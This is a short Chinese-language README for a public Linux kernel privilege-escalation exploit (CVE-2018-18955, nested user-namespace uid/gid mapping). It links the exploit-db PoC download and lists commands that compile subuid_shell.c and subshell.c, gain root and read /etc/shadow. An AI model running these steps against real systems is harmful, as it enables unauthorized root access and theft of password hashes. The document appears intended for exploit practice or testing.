# sub

---

介绍
- 嵌套用户命名空间的uid/gid映射损坏
- CVE-2018-18955
- linux内核提权
- 日期：2018-11-16
- 适用ubuntu提权 存在userns >=4.15

教程
- https://www.freebuf.com/news/197122.html
- https://www.exploit-db.com/exploits/45886

poc下载
- https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip


操作
```
cd sub
# 编译过程
gcc -o subuid_shell subuid_shell.c
gcc -o subshell subshell.c

id               # 查看是普通用户权限
./subuid_shell   # 运行编译后的subuid_shell文件
id               # 查看是root用户权限

cat /etc/shadow  # 读取shadow文件，没有权限（需要root）
./subshell       # 运行编译后的subshell文件
id               # 查看是nobody用户权限
cat /etc/shadow  # 读取shadow文件,可以查看
```